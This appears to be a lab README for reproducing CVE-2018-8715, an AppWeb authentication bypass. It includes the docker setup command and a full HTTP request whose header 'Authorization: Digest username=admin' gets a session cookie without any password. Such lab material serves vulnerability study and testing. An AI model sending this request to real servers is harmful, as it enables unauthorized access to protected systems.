# AppWeb Authentication Bypass（CVE-2018-8715）

[中文版本（Chinese version）](https://github.com/vulhub/vulhub/blob/master/appweb/CVE-2018-8715/README.zh-cn.md )

AppWeb is an embeded web server developed by Embedthis Software LLC. Writen in C/C++, can be run most OS.

AppWeb can be configued to use authentication，including the following three ：

- ​	basic  auth
- ​	digest auth，store session with cookie，instead of Aurhorization header
- ​	form auth

version < 7.0.3  ，there is a vulnerability with digest auth and form auth；If user give **null** as a password,

AppWeb will response as success because of a logic vul.



Reference:

- https://ssd-disclosure.com/index.php/archives/3676
- https://github.com/embedthis/appweb/issues/610



## Vulnerability environment

start the Vulnerability environment

```
docker-compose up -d
```

Access`http://your-ip:8080`，then you will see the username and password field。

## Exploit

You need to know an existed username，there is an admin for the environment.

Generate a http header  `Authorization: Digest username=admin`，send the below packet to the server:

```
GET / HTTP/1.1
Host: example.com
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Authorization: Digest username=admin


```

In the response, because of the empty password field，the server represent an error with a http status-code 200，including a sessioin as well.

![](1.png)

Use the session above  in the brower，then we can access the page which is originly need to be authenticed：

![](2.png)
